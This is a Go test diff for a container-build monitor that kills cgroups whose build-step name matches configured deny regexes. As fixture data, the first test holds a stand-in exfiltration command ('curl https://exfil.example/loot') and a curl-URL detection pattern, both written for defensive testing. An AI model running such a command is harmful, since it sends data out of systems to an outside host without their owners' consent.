@@ -4,6 +4,7 @@ import (
 	"context"
 	"os"
 	"path/filepath"
+	"regexp"
 	"strconv"
 	"testing"
 	"time"
@@ -642,6 +643,109 @@ func TestCgroupJoiner_KillsUnauthorizedSession(t *testing.T) {
 
 	cancel()
 	<-done
+}
+
+// TestCgroupJoiner_KillsOnDenyVertexPattern covers the per-vertex
+// kill-switch: when a candidate vertex's Name matches a configured
+// deny regex, the joiner must SIGKILL the cgroup BEFORE linking.
+// Mirrors TestCgroupJoiner_KillsUnauthorizedSession in structure;
+// the only difference is the policy primitive that triggers the kill.
+func TestCgroupJoiner_KillsOnDenyVertexPattern(t *testing.T) {
+	root := t.TempDir()
+	reg := NewSessionRegistry(time.Minute)
+
+	// Policy: kill any vertex whose Name contains "curl https?://".
+	deny := regexp.MustCompile(`curl https?://`)
+	reg.SetBuildVertexDenyPatterns([]*regexp.Regexp{deny})
+
+	// Session is fully authorized (CI metadata present) — the kill
+	// here is gated on vertex name only.
+	reg.RegisterSession("rGood", time.Unix(1000, 0), map[string]string{
+		FrontendAttrKeyProjectPath: "team/alpha",
+	})
+	reg.UpsertVertex("rGood", VertexState{
+		Digest:    "dExfil",
+		Name:      "[stage 2/5] RUN curl https://exfil.example/loot",
+		StartedAt: time.Unix(1010, 0),
+	})
+
+	cgroupPath := stageCgroup(t, root, "ctr-vertex", 7777, "/bin/sh\x00-c\x00curl https://exfil.example/loot\x00")
+	killFile := filepath.Join(cgroupPath, "cgroup.kill")
+
+	if err := os.WriteFile(killFile, nil, 0o600); err != nil {
+		t.Fatalf("stage cgroup.kill: %v", err)
+	}
+
+	source := newFakeEventSource()
+	statFn := func(_ string) (uint64, error) { return 7777, nil }
+
+	j := NewCgroupJoiner(reg, source, nil,
+		WithProcRoot(filepath.Join(root, "proc")),
+		WithStatFn(statFn),
+	)
+
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
+
+	done := make(chan struct{})
+	go func() {
+		_ = j.Run(ctx)
+
+		close(done)
+	}()
+
+	source.creates <- CgroupCreateEvent{ContainerID: "ctr-vertex", CgroupPath: cgroupPath}
+
+	waitFor(t, time.Second, func() bool {
+		data, err := os.ReadFile(killFile)
+
+		return err == nil && string(data) == "1"
+	})
+
+	// No binding should land — the kill path replaces LinkCgroup.
+	if _, ok := reg.LookupByCgroupID(7777); ok {
+		t.Fatal("deny-pattern match wrote a binding instead of just killing")
+	}
+
+	cancel()
+	<-done
+}
+
+// TestSessionRegistry_MatchesDenyVertexPattern is a focused unit test
+// for the pattern-matching helper itself, independent of the joiner's
+// event-loop wiring.
+func TestSessionRegistry_MatchesDenyVertexPattern(t *testing.T) {
+	t.Parallel()
+
+	reg := NewSessionRegistry(time.Minute)
+	if reg.MatchesDenyVertexPattern("[1/1] RUN echo hello") {
+		t.Fatal("no patterns installed → must return false")
+	}
+
+	patterns := []*regexp.Regexp{
+		regexp.MustCompile(`RUN npm install`),
+		regexp.MustCompile(`apt-get`),
+	}
+	reg.SetBuildVertexDenyPatterns(patterns)
+
+	cases := map[string]bool{
+		"[stage 2/5] RUN npm install":           true,
+		"[stage 3/5] RUN apt-get update":        true,
+		"[stage 1/5] RUN echo hi":               false,
+		"[stage 4/5] FROM alpine:3.18":          false,
+		"[stage 5/5] RUN yarn install --frozen": false, // yarn ≠ npm
+	}
+	for name, want := range cases {
+		if got := reg.MatchesDenyVertexPattern(name); got != want {
+			t.Errorf("MatchesDenyVertexPattern(%q) = %v, want %v", name, got, want)
+		}
+	}
+
+	// Disable via empty slice.
+	reg.SetBuildVertexDenyPatterns(nil)
+	if reg.MatchesDenyVertexPattern("[stage 2/5] RUN npm install") {
+		t.Error("after SetBuildVertexDenyPatterns(nil), policy should be disabled")
+	}
 }
 
 func TestCgroupJoiner_NoMatchSilentlyDropped(t *testing.T) {
